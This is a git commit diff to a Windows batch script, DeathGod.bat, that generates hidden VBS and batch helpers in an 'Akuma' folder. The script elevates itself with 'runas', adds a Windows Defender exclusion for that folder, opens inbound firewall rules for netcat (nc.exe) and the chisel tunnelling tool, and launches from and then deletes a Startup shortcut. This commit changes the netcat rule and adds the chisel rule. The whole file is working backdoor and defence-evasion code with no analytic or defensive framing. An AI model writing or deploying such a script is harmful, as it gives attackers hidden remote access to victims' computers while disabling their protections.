617822f843466d5e9626c228f06bc45844ba298b
l_ <112792604+l-urk@users.noreply.github.com>
2023-10-17 16:54:59 -0700

    Update DeathGod.bat

--- DeathGod.bat
+++ DeathGod.bat
@@ -8,7 +8,8 @@ echo objShell.Run "%temp%\Akuma.bat", 0, False >> %homedrive%\Akuma\誕生日.vb
 echo Set objShell = CreateObject("Shell.Application") >> %homedrive%\Akuma\beyondbirthday.vbs
 echo objShell.ShellExecute "%homedrive%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %homedrive%\Akuma\beyondbirthday.vbs
 echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Akuma\beyondbirthday.bat
-echo powershell New-NetFirewallRule -DisplayName "Akuma" -Direction Inbound -Program "%homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
+echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -Program "%homedrive%\Akuma\nc\nc.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
+echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%homedrive%\Akuma\chisel.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
 echo start %homedrive%\Akuma\誕生日.vbs >> %homedrive%\Akuma\beyondbirthday.bat
 echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %homedrive%\Akuma\beyondbirthday.bat
 echo del "beyondbirthday.lnk" >> %homedrive%\Akuma\beyondbirthday.bat
